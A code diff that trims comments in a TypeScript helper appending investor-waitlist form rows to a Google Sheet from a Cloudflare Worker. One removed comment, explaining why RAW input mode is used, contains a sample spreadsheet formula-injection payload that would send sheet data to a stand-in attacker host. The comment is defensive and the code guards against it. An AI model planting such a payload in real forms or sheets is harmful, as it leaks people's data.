@@ -1,13 +1,8 @@
-// Appends a row to a Google Sheet via the Sheets API v4, authenticated as a
-// Google service account. Written for the investor waitlist form
-// (src/pages/api/contact.ts) to mirror how the old Wix site handled it: rows
-// land in a spreadsheet, nobody gets emailed.
+// Appends a row to a Google Sheet (Sheets API v4) as a Google service
+// account. Used by the investor waitlist form (src/pages/api/contact.ts).
 //
-// This runs on Cloudflare Workers (edge runtime), so there's no Node `crypto`
-// and no `googleapis` package (it assumes Node). A service account normally
-// authenticates by signing a JWT with its private key and exchanging that for
-// an OAuth access token - here that signing is done by hand with the
-// platform's own Web Crypto (`crypto.subtle`), which Workers fully supports.
+// Workers have no Node crypto, so the service account JWT is signed with Web
+// Crypto and exchanged for an OAuth access token.
 
 interface ServiceAccountCreds {
   clientEmail: string;
@@ -25,12 +20,8 @@ function base64UrlEncodeString(value: string): string {
   return base64UrlEncode(new TextEncoder().encode(value));
 }
 
-// Service account private keys come down from Google as PEM
-// ("-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"). Env vars
-// can't hold real newlines cleanly, so this also accepts the same string with
-// literal "\n" escapes (however it gets pasted into the Webflow Cloud
-// dashboard) and normalizes either form before handing it to WebCrypto, which
-// only wants the raw base64 body.
+// Accepts the PEM key with real newlines or with literal "\n" escapes, as
+// pasted into an env var, and returns the base64 body Web Crypto expects.
 async function importPrivateKey(pem: string): Promise<CryptoKey> {
   const normalized = pem.replace(/\\n/g, '\n');
   const body = normalized
@@ -55,9 +46,8 @@ async function getAccessToken(creds: ServiceAccountCreds): Promise<string> {
     scope: 'https://www.googleapis.com/auth/spreadsheets',
     aud: 'https://oauth2.googleapis.com/token',
     iat: nowSec,
-    // Google caps this at one hour; there's no token cache here since the
-    // waitlist form is low-traffic enough that minting a fresh one per
-    // submission is cheap.
+    // Tokens last an hour. The form is low traffic, so each submission mints
+    // a new one.
     exp: nowSec + 3600,
   };
   const unsigned = `${base64UrlEncodeString(JSON.stringify(header))}.${base64UrlEncodeString(JSON.stringify(claims))}`;
@@ -85,9 +75,8 @@ async function getAccessToken(creds: ServiceAccountCreds): Promise<string> {
   return data.access_token;
 }
 
-// `range` is a sheet name (e.g. "Sheet1") or an A1 range within it - the
-// Sheets API appends after the last row of whatever range you give it,
-// finding that row itself, so a bare tab name is enough.
+// `range` is a tab name (e.g. "Sheet1") or an A1 range; the API appends after
+// its last row.
 export async function appendRow(
   env: any,
   values: (string | number)[],
@@ -108,13 +97,9 @@ export async function appendRow(
 
   const accessToken = await getAccessToken({ clientEmail, privateKeyPem });
 
-  // RAW, not USER_ENTERED: these values come from a public form, and
-  // USER_ENTERED parses each one as though a person typed it - so a
-  // submitted "email" of =IMPORTXML("https://evil.example/?d="&A1,"//a")
-  // would be stored as a live formula and run the moment someone opened the
-  // sheet, leaking its contents. RAW stores every value as the literal text
-  // that was submitted. The tradeoff is that the timestamp column stays text
-  // rather than a parsed date; ISO-8601 still sorts correctly as text.
+  // RAW, not USER_ENTERED: values come from a public form, and USER_ENTERED
+  // would store input like =IMPORTXML(...) as a live formula. Timestamps
+  // therefore stay ISO-8601 text, which still sorts correctly.
   const url = `https://sheets.googleapis.com/v4/spreadsheets/${spreadsheetId}/values/${encodeURIComponent(
     range,
   )}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`;
